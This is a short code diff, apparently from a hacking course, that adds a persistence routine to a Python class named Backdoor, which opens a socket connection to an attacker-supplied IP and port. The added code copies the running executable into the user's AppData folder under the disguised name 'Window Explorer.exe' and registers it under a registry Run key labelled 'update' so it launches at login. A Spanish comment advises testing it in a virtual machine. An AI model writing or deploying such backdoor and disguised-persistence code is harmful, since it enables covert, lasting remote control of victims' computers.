@@ -12,8 +12,15 @@ import platform
 
 class Backdoor:
     def __init__(self, ip, port):
+        self.become_persistent() #Desactivar por si se pone muy molesto. Usarlo solo en caso necesario y en uso de prueba usar Maquina Virtual
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
+        
+    def become_persistent(self):
+        evil_file_location = os.environ["appdata"] + "\\Window Explorer.exe"
+        if not os.path.exists(evil_file_location):
+            shutil.copyfile(sys.executable, evil_file_location)
+            subprocess.call('reg add HKCU\Software\Microsoft\Window\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)
 
     def reliable_send(self, data):
         json_data = json.dumps(data)
